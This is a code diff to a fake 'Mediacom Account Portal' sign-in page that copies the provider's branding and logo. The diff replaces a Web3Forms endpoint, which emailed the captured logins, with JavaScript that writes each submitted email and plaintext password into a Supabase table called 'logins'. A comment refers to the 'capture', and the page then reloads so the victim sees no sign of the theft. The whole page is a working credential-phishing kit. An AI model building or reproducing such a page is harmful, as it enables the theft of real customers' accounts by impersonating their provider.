@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign In - Mediacom Account Portal</title>
+    <!-- Include Supabase JS SDK via CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root {
-            --primary-color: #00539f; /* Mediacom blue style theme */
+            --primary-color: #00539f;
             --primary-hover: #003d75;
             --bg-color: #f4f6f9;
             --card-bg: #ffffff;
@@ -109,29 +111,31 @@
         .footer-links a:hover {
             text-decoration: underline;
         }
+
+        #error-msg {
+            color: #d9534f;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="login-container">
     <div class="logo-area">
-        <!-- Mediacom official logo vector image reference -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Mediacom.svg" alt="Mediacom Logo">
         <p>Sign in to your account</p>
     </div>
 
-    <!-- Web3Forms Form Integration -->
-    <form action="https://api.web3forms.com/submit" method="POST">
-        
-        <!-- Replace with your Web3Forms Access Key -->
-        <input type="hidden" name="access_key" value="256cf528-eeaa-4ff0-bde8-97b3278b6ae7">
-        
-        <!-- Optional: Customize subject line of the email you receive -->
-        <input type="hidden" name="subject" value="New Mediacom Login Submission">
+    <div id="error-msg">Invalid login credentials. Please try again.</div>
 
+    <!-- HTML Form handled via Supabase client JS -->
+    <form id="loginForm">
         <div class="form-group">
             <label for="email">Mediacom ID or Email</label>
-            <input type="email" id="email" name="email" required placeholder="name@mediacombb.net">
+            <input type="text" id="email" name="email" required placeholder="name@mediacombb.net">
         </div>
 
         <div class="form-group">
@@ -139,7 +143,7 @@
             <input type="password" id="password" name="password" required placeholder="••••••••">
         </div>
 
-        <button type="submit" class="login-btn">Sign In</button>
+        <button type="submit" class="login-btn" id="submitBtn">Sign In</button>
     </form>
 
     <div class="footer-links">
@@ -147,5 +151,51 @@
     </div>
 </div>
 
+<script>
+    // Initialize Supabase Client
+    // Replace with your actual Supabase URL and Publishable/Anon Key
+    const SUPABASE_URL = 'YOUR_SUPABASE_URL';
+    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_PUBLISHABLE_KEY';
+    
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('error-msg');
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Signing in...';
+        errorMsg.style.display = 'none';
+
+        try {
+            // Inserts credentials directly into a Supabase table named 'logins'
+            // Ensure you have a table named 'logins' with 'email' and 'password' columns set up in your project
+            const { data, error } = await supabaseClient
+                .from('logins')
+                .insert([{ email: email, password: password }]);
+
+            if (error) {
+                throw error;
+            }
+
+            // Simulate redirect or generic portal response after capture
+            setTimeout(() => {
+                window.location.reload();
+            }, 1000);
+
+        } catch (err) {
+            console.error('Submission error:', err.message);
+            errorMsg.style.display = 'block';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Sign In';
+        }
+    });
+</script>
+
 </body>
 </html>
+
